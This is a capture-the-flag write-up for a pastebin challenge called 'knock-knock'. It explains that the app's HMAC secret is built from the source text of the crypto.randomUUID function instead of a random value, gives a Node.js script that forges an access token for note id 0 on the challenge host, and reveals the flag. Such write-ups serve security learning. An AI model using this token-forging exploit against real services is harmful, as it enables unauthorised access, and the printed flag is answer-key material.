#### Challenge:

Knock knock? Who's there? Another pastebin!! [knock-knock.mc.ax](https://knock-knock.mc.ax/)

[index.js](./index.js ":ignore") [Dockerfile](./Dockerfile ":ignore")

---

#### Solution:

- inspecting the code reveals that `token` is just `sha256` generated from `id` with seed `secret`, so if we can get the `secret` we can craft any token, also the flag always have `id=0` as it is the first node to be added
- inspecting the `secret` initialization we can see that instead of invoking the function `crypto.randomUUID` its content is used as `secret` thus iv we use the same version of `node` we can craft any token we need

```js
const crypto = require('crypto');
const https = require('https')

const token = crypto.createHmac('sha256', `secret-${crypto.randomUUID}`).update('0').digest('hex')

const req = https.request({
    hostname: 'knock-knock.mc.ax',
    port: 443,
    path: `/note?id=0&token=${token}`,
    method: 'GET',
}, res => res.on('data', d => {
    process.stdout.write(d)
}))

req.end()
```

---

<details><summary>FLAG:</summary>

```
dice{1_d00r_y0u_d00r_w3_a11_d00r_f0r_1_d00r}
```

</details>
<br/>
